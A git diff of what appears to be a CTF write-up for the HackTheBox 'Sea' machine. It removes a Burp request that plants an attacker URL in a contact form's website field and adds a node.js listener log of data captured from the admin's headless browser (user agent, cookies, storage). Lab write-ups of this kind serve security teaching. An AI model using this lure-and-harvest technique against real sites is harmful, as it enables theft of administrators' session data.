@@ -169,28 +169,39 @@ DOWNLOADED: 27672 - FOUND: 15
 
 ![image](https://github.com/user-attachments/assets/2ade61b0-b05b-4312-8ad3-bc6df62e1729)
 
-python3 web server output:
+python3 web server html redirect output:
 ```bash
 Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
 10.129.3.193 - - [03/Oct/2024 00:21:38] "GET / HTTP/1.1" 200 -
 ```
 
-burp request:
+node.js redirect listener output:
 ```bash
-POST /contact.php HTTP/1.1
-Host: sea.htb
-Content-Length: 73
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://sea.htb
-Content-Type: application/x-www-form-urlencoded
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://sea.htb/contact.php
-Accept-Encoding: gzip, deflate, br
-Accept-Language: en-US,en;q=0.9
-Cookie: PHPSESSID=ul837dk36hbbj5d15s6hm7hu3b
-Connection: close
+--- Received Data from Admin ---
 
-name=Name&email=email%40email.email&age=0&country=Country&website=http://10.10.14.46:4444/
+User-Agent:  Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36 
+
+Cookies:  No cookies found 
+
+Local Storage:
+┌─────────┐
+│ (index) │
+├─────────┤
+└─────────┘
+
+Session Storage:
+┌─────────┐
+│ (index) │
+├─────────┤
+└─────────┘
+
+Document Data:
+┌──────────┬────────────────────────────┐
+│ (index)  │           Values           │
+├──────────┼────────────────────────────┤
+│  title   │           'CTF'            │
+│   url    │ 'http://10.10.14.46:4444/' │
+│ referrer │             ''             │
+│  domain  │       '10.10.14.46'        │
+└──────────┴────────────────────────────┘
 ```
